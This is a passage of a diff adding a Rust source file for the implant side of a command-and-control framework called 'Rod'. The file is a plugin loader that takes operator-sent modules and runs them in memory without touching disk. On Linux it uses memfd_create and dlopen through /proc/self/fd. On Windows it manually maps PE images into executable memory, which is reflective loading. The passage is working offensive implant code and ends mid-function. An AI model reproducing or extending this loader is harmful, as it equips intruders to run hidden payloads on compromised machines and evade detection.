@@ -1,0 +1,1372 @@
+//! The implant-side plugin seam (architecture.md Sec 5.4): C-ABI capability
+//! modules loaded on demand over the staged task channel. The registry
+//! here is the implant-side twin of the server's capability registry -- a
+//! verb arrives by `module.load`, its routes join the dispatch table, and
+//! the advertised set widens so the next contact reports them.
+//!
+//! The domain is the stateless long tail. Guards hold the line the design
+//! draws: a module cannot register a verb the artifact compiles (the
+//! compiled arm would shadow it forever) nor a channel verb (a plugin
+//! cannot own a live channel or a carriage), and verb names must follow
+//! the `namespace.action` grammar every Rod verb follows.
+//!
+//! The platform boundary is honest (architecture.md Sec 5.4): the seam
+//! rides the host platform's own in-process loading. The static musl
+//! artifact carries none -- `load` there refuses with the boundary named
+//! -- and the crate fork stays that artifact's extension path.
+
+use std::collections::HashMap;
+use std::sync::{Arc, Mutex};
+
+use crate::channel;
+use crate::handlers::{self, Outcome};
+
+/// The C-ABI version the loader speaks; the mirror of
+/// `rod_plugin_sdk::ABI_VERSION`. The two crates share the contract, not a
+/// dependency: the implant defines its own copy the way every implant
+/// language would.
+const ABI_VERSION: u32 = 1;
+
+/// A length-delimited byte string as it crosses the boundary -- the shape
+/// `rod-plugin-sdk`'s `RodStr` defines. Not NUL-terminated: task arguments
+/// are opaque bytes and cannot ride a C string.
+#[cfg_attr(all(unix, target_env = "musl"), allow(dead_code))]
+#[repr(C)]
+struct AbiStr {
+    ptr: *mut u8,
+    len: usize,
+}
+
+#[cfg_attr(all(unix, target_env = "musl"), allow(dead_code))]
+impl AbiStr {
+    fn empty() -> AbiStr {
+        AbiStr {
+            ptr: std::ptr::null_mut(),
+            len: 0,
+        }
+    }
+
+    fn from_slice(bytes: &[u8]) -> AbiStr {
+        AbiStr {
+            ptr: bytes.as_ptr() as *mut u8,
+            len: bytes.len(),
+        }
+    }
+
+    /// The string as lossy text, for copying out before the free. A null
+    /// pointer is the empty string -- the only null the SDK's shapes emit.
+    unsafe fn as_text(&self) -> String {
+        if self.ptr.is_null() || self.len == 0 {
+            return String::new();
+        }
+        let bytes = unsafe { std::slice::from_raw_parts(self.ptr, self.len) };
+        String::from_utf8_lossy(bytes).into_owned()
+    }
+}
+
+/// One run's outcome as the shim reports it: success or failure with the
+/// module's output string, or a shim error (an unknown index, a fenced
+/// panic) carrying the cause.
+#[cfg_attr(all(unix, target_env = "musl"), allow(dead_code))]
+enum RunStatus {
+    Succeeded(String),
+    Failed(String),
+    Error(String),
+}
+
+/// One loaded module's library half: the platform handle behind the entry
+/// family. A trait, not a struct, so the registry's guards and dispatch
+/// are unit-testable without a dynamic loader in the loop.
+#[cfg_attr(all(unix, target_env = "musl"), allow(dead_code))]
+trait Library: Send {
+    /// The ABI version the module reports. A loader that does not
+    /// recognize it refuses the module whole.
+    fn abi(&self) -> u32;
+
+    /// The module's self-declared name.
+    fn name(&self) -> String;
+
+    /// Construct the verb table and answer its size. Called once, at load.
+    fn verb_count(&self) -> u32;
+
+    /// The verb name at an index, or None past the table's end.
+    fn verb_name(&self, index: u32) -> Option<String>;
+
+    /// Execute one verb under the shared string grammar.
+    fn run(&self, index: u32, arguments: &str) -> RunStatus;
+
+    /// Return module-allocated memory. The host never frees module memory
+    /// itself; an export the module did not ship means nothing was
+    /// allocated to return.
+    fn free_string(&self, string: AbiStr);
+}
+
+/// A registered route: the module that owns the verb and its index in the
+/// module's table. Last registration wins -- a later module's route for a
+/// verb replaces the earlier one's.
+pub(crate) struct Route {
+    module: Arc<ModuleEntry>,
+    index: u32,
+}
+
+pub(crate) struct ModuleEntry {
+    name: String,
+    verbs: Vec<String>,
+    library: Mutex<Option<Box<dyn Library>>>,
+}
+
+impl ModuleEntry {
+    fn new(name: String, verbs: Vec<String>, library: Box<dyn Library>) -> ModuleEntry {
+        ModuleEntry {
+            name,
+            verbs,
+            library: Mutex::new(Some(library)),
+        }
+    }
+
+    /// The crate's test seam: an entry over a stub library that answers
+    /// every run with the verb's name. Session-layer tests install one to
+    /// pin the advertisement widening without a platform loader.
+    #[cfg(test)]
+    pub(crate) fn new_for_test(name: &str, verbs: &[&str]) -> ModuleEntry {
+        struct StubLibrary {
+            name: &'static str,
+        }
+        impl Library for StubLibrary {
+            fn abi(&self) -> u32 {
+                ABI_VERSION
+            }
+            fn name(&self) -> String {
+                self.name.into()
+            }
+            fn verb_count(&self) -> u32 {
+                0
+            }
+            fn verb_name(&self, _index: u32) -> Option<String> {
+                None
+            }
+            fn run(&self, _index: u32, _arguments: &str) -> RunStatus {
+                RunStatus::Succeeded("stub".into())
+            }
+            fn free_string(&self, _string: AbiStr) {}
+        }
+        ModuleEntry::new(
+            name.into(),
+            verbs.iter().map(|verb| verb.to_string()).collect(),
+            Box::new(StubLibrary {
+                name: Box::leak(name.to_string().into_boxed_str()),
+            }),
+        )
+    }
+}
+
+impl Drop for ModuleEntry {
+    fn drop(&mut self) {
+        // Best-effort made exact where it can be: the library dies when
+        // the last Arc goes away, so a dispatch still running keeps its
+        // module alive and the unload lands the moment it ends.
+        drop(self.library.get_mut().expect("library lock").take());
+    }
+}
+
+/// The run's plugin table: the loaded modules and the verb routes they
+/// registered. One instance lives in the session and survives every
+/// reconnect and walk step, the way the cadence does -- but not a process
+/// restart: registrations are run-state, and a restarted implant
+/// re-advertises without them (the operator re-loads what is still
+/// needed).
+pub struct Plugins {
+    inner: Mutex<Inner>,
+}
+
+struct Inner {
+    modules: Vec<Arc<ModuleEntry>>,
+    routes: HashMap<String, Route>,
+}
+
+impl Default for Plugins {
+    fn default() -> Plugins {
+        Plugins::new()
+    }
+}
+
+impl Plugins {
+    pub fn new() -> Plugins {
+        Plugins {
+            inner: Mutex::new(Inner {
+                modules: Vec::new(),
+                routes: HashMap::new(),
+            }),
+        }
+    }
+
+    /// Loads one module: verifies the handle and the staged payload's
+    /// integrity, asks the platform loader for a library, checks the ABI,
+    /// reads the verb table, and registers the routes the guards admit.
+    /// Answers the load report the operator reads on the task.
+    pub fn load(
+        &self,
+        handle: &str,
+        bytes: &[u8],
+        expected_sha256: &str,
+    ) -> Result<String, String> {
+        validate_handle(handle)?;
+        verify_sha256(bytes, expected_sha256)?;
+        let library = load_library(bytes)?;
+        if library.abi() != ABI_VERSION {
+            return Err(format!(
+                "module reports ABI {} and this build loads {}",
+                library.abi(),
+                ABI_VERSION
+            ));
+        }
+        let declared = library.name();
+        let name = registry_name(handle, &declared);
+        let count = library.verb_count();
+        let mut verbs = Vec::new();
+        for index in 0..count {
+            let verb = library
+                .verb_name(index)
+                .ok_or_else(|| format!("module did not name verb {index}"))?;
+            validate_verb(&verb)?;
+            verbs.push(verb);
+        }
+        if verbs.is_empty() {
+            return Err(format!("module {name} registers no verbs"));
+        }
+        let entry = Arc::new(ModuleEntry::new(name, verbs.clone(), library));
+
+        let mut inner = self.inner.lock().expect("plugin table");
+        // A same-name load replaces the module it names: its routes drop
+        // with it, and any verb the new module does not carry stops
+        // routing -- the honest answer to "load the fixed version".
+        inner.modules.retain(|held| held.name != entry.name);
+        inner.modules.push(Arc::clone(&entry));
+        for (index, verb) in verbs.iter().enumerate() {
+            inner.routes.insert(
+                verb.clone(),
+                Route {
+                    module: Arc::clone(&entry),
+                    index: index as u32,
+                },
+            );
+        }
+        Ok(format!(
+            "module {} loaded: {}; advertised at the next contact",
+            entry.name,
+            verbs.join(", ")
+        ))
+    }
+
+    /// Retracts one module -- best-effort by construction: the routes drop
+    /// immediately, and the library dies when the last dispatch holding it
+    /// ends (a handler mid-execution finishes).
+    pub fn unload(&self, name: &str) -> Result<String, String> {
+        let mut inner = self.inner.lock().expect("plugin table");
+        let Some(position) = inner.modules.iter().position(|held| held.name == name) else {
+            return Err(format!("module.load has no module named {name}"));
+        };
+        let entry = inner.modules.remove(position);
+        inner
+            .routes
+            .retain(|_, route| !Arc::ptr_eq(&route.module, &entry));
+        Ok(format!(
+            "module {name} unloaded ({}; library unload is best-effort)",
+            entry.verbs.join(", ")
+        ))
+    }
+
+    /// The loaded modules and their verbs, one line each -- what
+    /// `module.list` reports.
+    pub fn list(&self) -> String {
+        let inner = self.inner.lock().expect("plugin table");
+        if inner.modules.is_empty() {
+            return "no modules loaded".into();
+        }
+        let mut lines = Vec::new();
+        for module in &inner.modules {
+            lines.push(format!("{}: {}", module.name, module.verbs.join(", ")));
+        }
+        lines.join("\n")
+    }
+
+    /// Dispatches one verb to the module that registered it, or None when
+    /// no route holds the verb. Runs outside the table lock: a long
+    /// handler must not block the registry's own reads, and the Arc keeps
+    /// the module alive for the run's duration however the table mutates.
+    pub fn dispatch(&self, verb: &str, arguments: &str) -> Option<(Outcome, String)> {
+        let (module, index) = {
+            let inner = self.inner.lock().expect("plugin table");
+            inner
+                .routes
+                .get(verb)
+                .map(|route| (Arc::clone(&route.module), route.index))?
+        };
+        let guard = module.library.lock().expect("library lock");
+        let library = guard.as_ref()?;
+        Some(match library.run(index, arguments) {
+            RunStatus::Succeeded(output) => (Outcome::Succeeded, output),
+            RunStatus::Failed(output) => (Outcome::Failed, output),
+            RunStatus::Error(cause) => (Outcome::Failed, format!("{verb}: {cause}")),
+        })
+    }
+
+    /// Every verb the loaded modules registered -- the advertisement
+    /// widening source, read after each load.
+    pub fn advertised_verbs(&self) -> Vec<String> {
+        let inner = self.inner.lock().expect("plugin table");
+        inner.routes.keys().cloned().collect()
+    }
+
+    /// The registry's test seam: installs an entry the guards would admit,
+    /// the in-process equivalent of a `module.load` the platform loader
+    /// performed.
+    #[cfg(test)]
+    pub(crate) fn install(&self, entry: ModuleEntry) {
+        let name = entry.name.clone();
+        let verbs = entry.verbs.clone();
+        let entry = Arc::new(entry);
+        let mut inner = self.inner.lock().expect("plugin table");
+        inner.modules.retain(|held| held.name != name);
+        inner.modules.push(Arc::clone(&entry));
+        for (index, verb) in verbs.iter().enumerate() {
+            inner.routes.insert(
+                verb.clone(),
+                Route {
+                    module: Arc::clone(&entry),
+                    index: index as u32,
+                },
+            );
+        }
+    }
+}
+
+// The registry key the routes and module.list report: the module's own
+// declared name, with the task's handle honored when the module declares
+// none (an empty name would be ununloadable).
+fn registry_name(handle: &str, declared: &str) -> String {
+    if declared.trim().is_empty() {
+        handle.to_string()
+    } else {
+        declared.to_string()
+    }
+}
+
+fn validate_handle(handle: &str) -> Result<(), String> {
+    let valid = !handle.is_empty()
+        && handle.len() <= 64
+        && handle
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'));
+    if valid {
+        Ok(())
+    } else {
+        Err(format!(
+            "module.load expects '<name>' (ascii letters, digits, dot, dash, underscore; 64 bytes at most): '{handle}'"
+        ))
+    }
+}
+
+/// The load guards (architecture.md Sec 5.4): the namespace grammar, and
+/// the two domains a module cannot own -- the compiled set and the
+/// channel machinery.
+fn validate_verb(verb: &str) -> Result<(), String> {
+    let Some((namespace, action)) = verb.split_once('.') else {
+        return Err(format!(
+            "module verb '{verb}' is not a namespaced verb (namespace.action)"
+        ));
+    };
+    if namespace.is_empty() || action.is_empty() {
+        return Err(format!(
+            "module verb '{verb}' is not a namespaced verb (namespace.action)"
+        ));
+    }
+    if channel::is_channel_verb(verb) {
+        return Err(format!(
+            "module verb '{verb}' is a channel verb: a plugin cannot own a live channel"
+        ));
+    }
+    if handlers::COMPILED_VERBS.contains(&verb) {
+        return Err(format!(
+            "module verb '{verb}' is compiled into this artifact and stays compiled"
+        ));
+    }
+    Ok(())
+}
+
+fn verify_sha256(bytes: &[u8], expected: &str) -> Result<(), String> {
+    use sha2::{Digest, Sha256};
+    let actual: String = Sha256::digest(bytes)
+        .iter()
+        .map(|b| format!("{b:02x}"))
+        .collect();
+    if actual.eq_ignore_ascii_case(expected) {
+        Ok(())
+    } else {
+        Err(format!(
+            "module.load: payload hash mismatch: expected {expected}, received {actual}"
+        ))
+    }
+}
+
+// --- The platform loaders ---------------------------------------------------
+
+#[cfg(all(unix, not(target_env = "musl")))]
+fn load_library(bytes: &[u8]) -> Result<Box<dyn Library>, String> {
+    DlopenLibrary::load(bytes)
+}
+
+/// The static musl artifact carries no in-process dynamic loading
+/// (architecture.md Sec 5.4): musl's static shape has no dlopen, and the
+/// Rust toolchain produces no musl cdylib for a module to even be. The
+/// refusal is clean and names the boundary.
+#[cfg(all(unix, target_env = "musl"))]
+fn load_library(_bytes: &[u8]) -> Result<Box<dyn Library>, String> {
+    Err(
+        "module.load: this build's platform carries no dynamic module loader (the static musl artifact); rebuild the tradecraft into the artifact or load it on a dynamic platform"
+            .into(),
+    )
+}
+
+#[cfg(windows)]
+fn load_library(bytes: &[u8]) -> Result<Box<dyn Library>, String> {
+    pe::PeLibrary::load(bytes)
+}
+
+// --- Linux: the memfd + dlopen loader ---------------------------------------
+
+#[cfg(all(unix, not(target_env = "musl")))]
+mod dlopened {
+    use std::ffi::{CStr, CString};
+
+    use super::{AbiStr, Library, RunStatus};
+
+    type AbiFn = unsafe extern "C" fn() -> u32;
+    type NameFn = unsafe extern "C" fn() -> AbiStr;
+    type InitFn = unsafe extern "C" fn() -> u32;
+    type VerbNameFn = unsafe extern "C" fn(u32) -> AbiStr;
+    type RunFn = unsafe extern "C" fn(u32, AbiStr, *mut AbiStr) -> i32;
+    type FreeFn = unsafe extern "C" fn(*mut u8, usize);
+
+    /// One dlopen'd module: the platform's own library object behind the
+    /// entry family, resolved per call through dlsym. The drop path's
+    /// dlclose is the best-effort unload the registry documents.
+    pub struct DlopenLibrary {
+        handle: *mut std::ffi::c_void,
+    }
+
+    // dlopen handles are thread-safe for dlsym; the run loop owns the
+    // registry anyway.
+    unsafe impl Send for DlopenLibrary {}
+
+    impl DlopenLibrary {
+        /// Stages the bytes in a memfd and dlopens it through
+        /// `/proc/self/fd` -- the same anonymous-fd staging the launcher
+        /// one-liners perform, so nothing lands on the filesystem at any
+        /// step.
+        pub fn load(bytes: &[u8]) -> Result<Box<dyn Library>, String> {
+            let name = c"rod-module";
+            let fd = unsafe { libc::memfd_create(name.as_ptr(), 0) };
+            if fd < 0 {
+                return Err(format!(
+                    "module.load: memfd_create: errno {}",
+                    std::io::Error::last_os_error().raw_os_error().unwrap_or(0)
+                ));
+            }
+            let mut written = 0usize;
+            while written < bytes.len() {
+                let count = unsafe {
+                    libc::write(
+                        fd,
+                        bytes[written..].as_ptr() as *const libc::c_void,
+                        bytes.len() - written,
+                    )
+                };
+                if count <= 0 {
+                    unsafe { libc::close(fd) };
+                    return Err(format!(
+                        "module.load: staging the bytes: errno {}",
+                        std::io::Error::last_os_error().raw_os_error().unwrap_or(0)
+                    ));
+                }
+                written += count as usize;
+            }
+            // The loader keeps its own reference to the mapping; the fd
+            // can close as soon as dlopen answers.
+            let path = CString::new(format!("/proc/self/fd/{fd}"))
+                .map_err(|_| "module.load: bad staging path".to_string())?;
+            let handle = unsafe { libc::dlopen(path.as_ptr(), libc::RTLD_NOW | libc::RTLD_LOCAL) };
+            let cause = unsafe { libc::dlerror() };
+            unsafe { libc::close(fd) };
+            if handle.is_null() {
+                let detail = if cause.is_null() {
+                    "unknown".into()
+                } else {
+                    unsafe { CStr::from_ptr(cause).to_string_lossy().into_owned() }
+                };
+                return Err(format!(
+                    "module.load: the bytes are not a loadable module: {detail}"
+                ));
+            }
+            Ok(Box::new(DlopenLibrary { handle }))
+        }
+
+        fn symbol(&self, export: &CStr) -> Result<*mut std::ffi::c_void, String> {
+            let symbol = unsafe { libc::dlsym(self.handle, export.as_ptr()) };
+            if symbol.is_null() {
+                return Err(format!(
+                    "module does not export {}",
+                    export.to_string_lossy()
+                ));
+            }
+            Ok(symbol)
+        }
+
+        fn read_owned(&self, string: AbiStr) -> String {
+            let text = unsafe { string.as_text() };
+            self.free_string(string);
+            text
+        }
+
+        fn entry<Entry: Copy>(&self, export: &CStr) -> Result<Entry, String> {
+            let symbol = self.symbol(export)?;
+            Ok(unsafe { std::mem::transmute_copy(&symbol) })
+        }
+    }
+
+    impl Library for DlopenLibrary {
+        fn abi(&self) -> u32 {
+            let Ok(abi) = self.entry::<AbiFn>(c"rod_plugin_abi") else {
+                return u32::MAX; // not a Rod module; the load refuses it
+            };
+            unsafe { abi() }
+        }
+
+        fn name(&self) -> String {
+            let Ok(name) = self.entry::<NameFn>(c"rod_plugin_name") else {
+                return String::new();
+            };
+            self.read_owned(unsafe { name() })
+        }
+
+        fn verb_count(&self) -> u32 {
+            let Ok(init) = self.entry::<InitFn>(c"rod_plugin_init") else {
+                return 0;
+            };
+            unsafe { init() }
+        }
+
+        fn verb_name(&self, index: u32) -> Option<String> {
+            let verb_name = self.entry::<VerbNameFn>(c"rod_plugin_verb_name").ok()?;
+            let name = self.read_owned(unsafe { verb_name(index) });
+            if name.is_empty() {
+                None
+            } else {
+                Some(name)
+            }
+        }
+
+        fn run(&self, index: u32, arguments: &str) -> RunStatus {
+            let Ok(run) = self.entry::<RunFn>(c"rod_plugin_run") else {
+                return RunStatus::Error("module does not export rod_plugin_run".into());
+            };
+            let args = AbiStr::from_slice(arguments.as_bytes());
+            let mut out = AbiStr::empty();
+            let status = unsafe { run(index, args, &mut out) };
+            let text = self.read_owned(out);
+            match status {
+                0 => RunStatus::Succeeded(text),
+                1 => RunStatus::Failed(text),
+                other => RunStatus::Error(format!("shim status {other}: {text}")),
+            }
+        }
+
+        fn free_string(&self, string: AbiStr) {
+            if string.ptr.is_null() || string.len == 0 {
+                return;
+            }
+            let Ok(free) = self.entry::<FreeFn>(c"rod_plugin_free") else {
+                return;
+            };
+            unsafe { free(string.ptr, string.len) };
+        }
+    }
+
+    impl Drop for DlopenLibrary {
+        fn drop(&mut self) {
+            unsafe { libc::dlclose(self.handle) };
+        }
+    }
+}
+
+#[cfg(all(unix, not(target_env = "musl")))]
+use dlopened::DlopenLibrary;
+
+// --- Windows: the manual PE map ----------------------------------------------
+
+#[cfg(windows)]
+mod pe {
+    //! The manual PE map (architecture.md Sec 5.4): `LoadLibrary` wants a
+    //! path and the seam keeps modules off disk, so the loader maps the
+    //! image itself -- allocate, copy sections, apply base relocations,
+    //! resolve imports against the system DLLs, give the image its TLS
+    //! block on the loading thread, call the entry, then walk the export
+    //! table for the entry family.
+    //!
+    //! Scope note: the TLS handling covers the loading thread -- the
+    //! reference implant dispatches every one-shot verb on the run loop
+    //! thread that loads, so module TLS access stays inside it by
+    //! construction. A host that dispatches module verbs off other threads
+    //! would need the TEB-wide patch the platform loader owns; that is
+    //! the rehearsal boundary to check on a Windows guest.
+
+    use std::collections::HashMap;
+    use std::ffi::CString;
+
+    use windows_sys::Win32::Foundation::{BOOL, HINSTANCE};
+    use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
+    use windows_sys::Win32::System::Memory::{
+        VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+    };
+    // The one DllMain reason the map calls; a local constant beats a
+    // windows-sys feature for a value the ABI froze decades ago.
+    const DLL_PROCESS_ATTACH: u32 = 1;
+
+    use super::{AbiStr, Library, RunStatus};
+
+    type AbiFn = unsafe extern "C" fn() -> u32;
+    type NameFn = unsafe extern "C" fn() -> AbiStr;
+    type InitFn = unsafe extern "C" fn() -> u32;
+    type VerbNameFn = unsafe extern "C" fn(u32) -> AbiStr;
+    type RunFn = unsafe extern "C" fn(u32, AbiStr, *mut AbiStr) -> i32;
+    type FreeFn = unsafe extern "C" fn(*mut u8, usize);
+
+    /// One manually mapped image: the allocation plus the resolved export
+    /// addresses. The unload posture is the map's own best-effort: routes
+    /// drop, and the allocation lives on -- a mapped image has no platform
+    /// refcount to retire against, and freeing pages under code a handler
+    /// still holds is worse than the leak.
+    pub struct PeLibrary {
+        base: *mut u8,
+        exports: HashMap<String, usize>,
+    }
+
+    unsafe impl Send for PeLibrary {}
+
+    impl PeLibrary {
+        pub fn load(bytes: &[u8]) -> Result<Box<dyn Library>, String> {
+            let image = parse(bytes)?;
+            unsafe { Self::map(&image) }
+        }
+
+        unsafe fn map(image: &PeImage) -> Result<Box<dyn Library>, String> {
+            let base = unsafe {
+                VirtualAlloc(
+                    std::ptr::null(),
+                    image.size_of_image as usize,
+                    MEM_RESERVE | MEM_COMMIT,
+                    PAGE_EXECUTE_READWRITE,
+                )
+            } as *mut u8;
+            if base.is_null() {
+                return Err("module.load: the image allocation failed".into());
+            }
+            // Headers, then each section at its virtual address.
+            unsafe {
+                std::ptr::copy_nonoverlapping(image.bytes.as_ptr(), base, image.headers_len);
+            }
+            for section in &image.sections {
+                if section.raw_size == 0 {
+                    continue;
+                }
+                unsafe {
+                    std::ptr::copy_nonoverlapping(
+                        image.bytes.as_ptr().add(section.raw_offset),
+                        base.add(section.virtual_address),
+                        section.raw_size,
+                    );
+                }
+            }
+            let delta = (base as usize).wrapping_sub(image.image_base as usize);
+            unsafe { relocate(base, image, delta)? };
+            unsafe { resolve_imports(base, image)? };
+            unsafe { give_tls(base, image)? };
+            if image.entry_point != 0 {
+                unsafe {
+                    let entry: unsafe extern "C" fn(
+                        HINSTANCE,
+                        u32,
+                        *mut core::ffi::c_void,
+                    ) -> BOOL = std::mem::transmute(base.add(image.entry_point));
+                    entry(base as HINSTANCE, DLL_PROCESS_ATTACH, std::ptr::null_mut());
+                }
+            }
+            let exports = unsafe { export_table(base, image)? };
+            Ok(Box::new(PeLibrary { base, exports }))
+        }
+
+        fn entry<Entry: Copy>(&self, name: &str) -> Result<Entry, String> {
+            let address = self
+                .exports
+                .get(name)
+                .copied()
+                .ok_or_else(|| format!("module does not export {name}"))?;
+            Ok(unsafe { std::mem::transmute_copy(&(base_add(self.base, address))) })
+        }
+
+        fn read_owned(&self, string: AbiStr) -> String {
+            let text = unsafe { string.as_text() };
+            self.free_string(string);
+            text
+        }
+    }
+
+    // The image's export addresses are RVAs into the mapped image.
+    fn base_add(base: *mut u8, rva: usize) -> usize {
+        unsafe { base.add(rva) as usize }
+    }
+
+    impl Library for PeLibrary {
+        fn abi(&self) -> u32 {
+            let Ok(abi) = self.entry::<AbiFn>("rod_plugin_abi") else {
+                return u32::MAX;
+            };
+            unsafe { abi() }
+        }
+
+        fn name(&self) -> String {
+            let Ok(name) = self.entry::<NameFn>("rod_plugin_name") else {
+                return String::new();
+            };
+            self.read_owned(unsafe { name() })
+        }
+
+        fn verb_count(&self) -> u32 {
+            let Ok(init) = self.entry::<InitFn>("rod_plugin_init") else {
+                return 0;
+            };
+            unsafe { init() }
+        }
+
+        fn verb_name(&self, index: u32) -> Option<String> {
+            let verb_name = self.entry::<VerbNameFn>("rod_plugin_verb_name").ok()?;
+            let name = self.read_owned(unsafe { verb_name(index) });
+            if name.is_empty() {
+                None
+            } else {
+                Some(name)
+            }
+        }
+
+        fn run(&self, index: u32, arguments: &str) -> RunStatus {
+            let Ok(run) = self.entry::<RunFn>("rod_plugin_run") else {
+                return RunStatus::Error("module does not export rod_plugin_run".into());
+            };
+            let args = AbiStr::from_slice(arguments.as_bytes());
+            let mut out = AbiStr::empty();
+            let status = unsafe { run(index, args, &mut out) };
+            let text = self.read_owned(out);
+            match status {
+                0 => RunStatus::Succeeded(text),
+                1 => RunStatus::Failed(text),
+                other => RunStatus::Error(format!("shim status {other}: {text}")),
+            }
+        }
+
+        fn free_string(&self, string: AbiStr) {
+            if string.ptr.is_null() || string.len == 0 {
+                return;
+            }
+            let Ok(free) = self.entry::<FreeFn>("rod_plugin_free") else {
+                return;
+            };
+            unsafe { free(string.ptr, string.len) };
+        }
+    }
+
+    // The parsed image: everything the mapper reads, bounds-checked once.
+    struct PeImage {
+        bytes: Vec<u8>,
+        headers_len: usize,
+        image_base: u64,
+        size_of_image: u32,
+        entry_point: usize,
+        sections: Vec<PeSection>,
+        reloc_rva: u32,
+        reloc_size: u32,
+        import_rva: u32,
+        import_size: u32,
+        export_rva: u32,
+        export_size: u32,
+        tls_rva: u32,
+        tls_size: u32,
+    }
+
+    struct PeSection {
+        virtual_address: usize,
+        raw_offset: usize,
+        raw_size: usize,
+    }
+
+    fn read_u16(bytes: &[u8], at: usize) -> u16 {
+        u16::from_le_bytes(bytes[at..at + 2].try_into().unwrap())
+    }
+
+    fn read_u32(bytes: &[u8], at: usize) -> u32 {
+        u32::from_le_bytes(bytes[at..at + 4].try_into().unwrap())
+    }
+
+    fn read_u64(bytes: &[u8], at: usize) -> u64 {
+        u64::from_le_bytes(bytes[at..at + 8].try_into().unwrap())
+    }
+
+    fn parse(bytes: &[u8]) -> Result<PeImage, String> {
+        let bad = |what: &str| format!("module.load: not a loadable PE image: {what}");
+        if bytes.len() < 0x40 || &bytes[..2] != b"MZ" {
+            return Err(bad("no DOS header"));
+        }
+        let pe_offset = read_u32(bytes, 0x3c) as usize;
+        if pe_offset + 24 + 240 > bytes.len() || &bytes[pe_offset..pe_offset + 4] != b"PE\0\0" {
+            return Err(bad("no PE header"));
+        }
+        let machine = read_u16(bytes, pe_offset + 4);
+        if machine != 0x8664 && machine != 0x14c {
+            return Err(bad("unsupported machine"));
+        }
+        let section_count = read_u16(bytes, pe_offset + 6) as usize;
+        let optional_size = read_u16(bytes, pe_offset + 20) as usize;
+        let optional = pe_offset + 24;
+        let magic = read_u16(bytes, optional);
+        let (image_base, data_directory): (u64, usize) = if magic == 0x20b {
+            (read_u64(bytes, optional + 24), optional + 112)
+        } else {
+            (read_u32(bytes, optional + 28) as u64, optional + 96)
+        };
+        let entry_point = read_u32(bytes, optional + 16) as usize;
+        let size_of_image = read_u32(bytes, optional + 56);
+        let headers_len = read_u32(bytes, optional + 60) as usize;
+        if data_directory + 16 * 8 > bytes.len() {
+            return Err(bad("truncated data directories"));
+        }
+        let directory = |index: usize| -> (u32, u32) {
+            (
+                read_u32(bytes, data_directory + index * 8),
+                read_u32(bytes, data_directory + index * 8 + 4),
+            )
+        };
+        let (reloc_rva, reloc_size) = directory(5);
+        let (import_rva, import_size) = directory(1);
+        let (export_rva, export_size) = directory(0);
+        let (tls_rva, tls_size) = directory(9);
+
+        let sections_at = optional + optional_size;
+        if sections_at + section_count * 40 > bytes.len() {
+            return Err(bad("truncated section table"));
+        }
+        let mut sections = Vec::with_capacity(section_count);
+        for index in 0..section_count {
+            let at = sections_at + index * 40;
+            let virtual_address = read_u32(bytes, at + 12) as usize;
+            let raw_size = read_u32(bytes, at + 16) as usize;
+            let raw_offset = read_u32(bytes, at + 20) as usize;
+            if raw_offset
+                .checked_add(raw_size)
+                .is_none_or(|end| end > bytes.len())
+            {
+                return Err(bad("a section runs past the file"));
+            }
+            if virtual_address
+                .checked_add(raw_size)
+                .is_none_or(|end| end > size_of_image as usize)
+            {
+                return Err(bad("a section runs past the image"));
+            }
+            sections.push(PeSection {
+                virtual_address,
+                raw_offset,
+                raw_size,
+            });
+        }
+        Ok(PeImage {
+            bytes: bytes.to_vec(),
+            headers_len,
+            image_base,
+            size_of_image,
+            entry_point,
+            sections,
+            reloc_rva,
+            reloc_size,
+            import_rva,
+            import_size,
+            export_rva,
+            export_size,
+            tls_rva,
+            tls_size,
+        })
+    }
+
+    // Unaligned reads off the mapped image -- the PE structures carry no
+    // alignment promise at arbitrary RVAs.
+    unsafe fn peek_u32(at: *mut u8) -> u32 {
+        unsafe { (at as *const u32).read_unaligned() }
+    }
+
+    unsafe fn peek_u16(at: *mut u8) -> u16 {
+        unsafe { (at as *const u16).read_unaligned() }
+    }
+
+    unsafe fn peek_u64(at: *mut u8) -> u64 {
+        unsafe { (at as *const u64).read_unaligned() }
+    }
+
+    unsafe fn poke_u32(at: *mut u8, value: u32) {
+        unsafe { (at as *mut u32).write_unaligned(value) };
+    }
+
+    unsafe fn poke_u64(at: *mut u8, value: u64) {
+        unsafe { (at as *mut u64).write_unaligned(value) };
+    }
+
+    unsafe fn relocate(base: *mut u8, image: &PeImage, delta: usize) -> Result<(), String> {
+        if delta == 0 || image.reloc_size == 0 {
+            return Ok(());
+        }
+        let mut offset = 0usize;
+        while offset + 8 <= image.reloc_size as usize {
+            let block = base.add(image.reloc_rva as usize + offset);
+            let block_size = unsafe { peek_u32(block) } as usize;
+            if block_size < 8 || block_size > image.reloc_size as usize - offset {
+                return Err("module.load: malformed relocation table".into());
+            }
+            let count = (block_size - 8) / 2;
+            for entry in 0..count {
+                let word = unsafe { peek_u16(block.add(8 + entry * 2)) };
+                let kind = word >> 12;
+                let at = word & 0xfff;
+                match kind {
+                    0 => {} // pad
+                    3 => unsafe {
+                        // HIGHLOW: a 32-bit VA.
+                        let slot = block.add(at as usize);
+                        poke_u32(slot, peek_u32(slot).wrapping_add(delta as u32));
+                    },
+                    10 => unsafe {
+                        // DIR64: a 64-bit VA.
+                        let slot = block.add(at as usize);
+                        poke_u64(slot, peek_u64(slot).wrapping_add(delta as u64));
+                    },
+                    other => {
+                        return Err(format!("module.load: unsupported relocation type {other}"))
+                    }
+                }
+            }
+            offset += block_size;
+        }
+        Ok(())
+    }
+
+    unsafe fn resolve_imports(base: *mut u8, image: &PeImage) -> Result<(), String> {
+        if image.import_rva == 0 && image.import_size == 0 {
+            return Ok(());
+        }
+        let mut offset = 0usize;
+        loop {
+            let descriptor = base.add(image.import_rva as usize + offset);
+            let name_rva = unsafe { peek_u32(descriptor.add(12)) };
+            if name_rva == 0 {
+                return Ok(());
+            }
+            let dll = unsafe { c_string_at(base.add(name_rva as usize)) };
+            let dll =
+                CString::new(dll).map_err(|_| "module.load: a bad import name".to_string())?;
+            let library = unsafe { LoadLibraryA(dll.as_ptr().cast()) };
+            if library.is_null() {
+                return Err(format!("module.load: import {dll:?} did not resolve"));
+            }
+            let first_thunk = unsafe { peek_u32(descriptor.add(16)) } as usize;
+            let original = unsafe { peek_u32(descriptor) } as usize;
+            let lookup_table = if original != 0 { original } else { first_thunk };
+            let mut slot = 0usize;
+            loop {
+                let value = unsafe { peek_u64(base.add(lookup_table + slot * 8)) };
+                if value == 0 {
